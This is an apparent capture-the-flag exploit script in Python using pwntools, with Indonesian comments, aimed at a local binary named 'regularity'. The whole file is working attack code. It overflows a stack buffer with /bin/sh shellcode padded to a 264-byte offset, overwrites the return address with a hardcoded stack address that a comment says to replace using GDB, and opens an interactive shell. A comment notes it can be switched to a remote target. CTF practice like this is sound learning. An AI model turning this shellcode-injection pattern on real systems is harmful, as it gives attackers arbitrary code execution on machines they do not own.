from pwn import *

context.binary = './regularity'
context.arch = 'amd64'

# Jalankan program lokal (atau ganti ke remote kalau perlu)
p = process('./regularity')

# Shellcode untuk /bin/sh (64-bit)
shellcode = asm(shellcraft.sh())

# Offset dari awal input ke RIP
offset = 264

# Payload: shellcode + padding buat nutupin 264 byte
payload = shellcode.ljust(offset, b'A')

# Ganti alamat ini setelah kamu dapatkan dari GDB (lihat langkah 3)
ret_addr = p64(0x7fffffffe4d0)  # ‚Üê INI CONTOH! GANTI NANTI

payload += ret_addr

# Kirim payload ke program
p.sendline(payload)

# Masuk ke shell
p.interactive()
